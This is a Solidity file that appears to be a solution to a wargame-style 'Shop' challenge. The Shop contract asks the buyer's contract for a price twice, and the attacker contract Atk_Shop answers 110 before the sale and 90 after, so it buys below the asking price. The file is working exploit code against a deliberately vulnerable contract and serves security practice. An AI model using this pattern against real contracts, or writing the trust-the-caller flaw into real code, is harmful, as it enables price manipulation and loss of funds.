// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint);
}

contract Shop {
    uint public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

contract Atk_Shop {
    Shop target;

    constructor(address addr) {
        target = Shop(payable(addr));
    }

    function price() external view returns (uint) {
        if(!target.isSold()) {
            return 110;
        }
        return 90;
    }

    function atk() public {
        target.buy();
    }

}